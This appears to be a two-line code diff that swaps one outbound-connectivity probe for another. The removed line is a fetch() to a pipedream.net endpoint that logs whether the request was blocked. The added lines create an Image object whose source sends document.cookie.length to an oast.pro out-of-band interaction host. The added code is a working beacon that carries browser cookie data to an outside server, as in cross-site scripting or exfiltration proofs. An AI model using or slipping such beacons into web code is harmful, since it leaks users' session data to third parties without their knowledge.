@@ -1,1 +1,2 @@
-fetch('https://eo56wycm1nkbk44.m.pipedream.net').then(r=>console.log('SUCCESS')).catch(e=>console.log('BLOCKED:', e))
+var i = new Image();
+i.src = 'db7j9l0vt33bgss9igag7cymoojfc413m.oast.pro/?c=' + document.cookie.length;
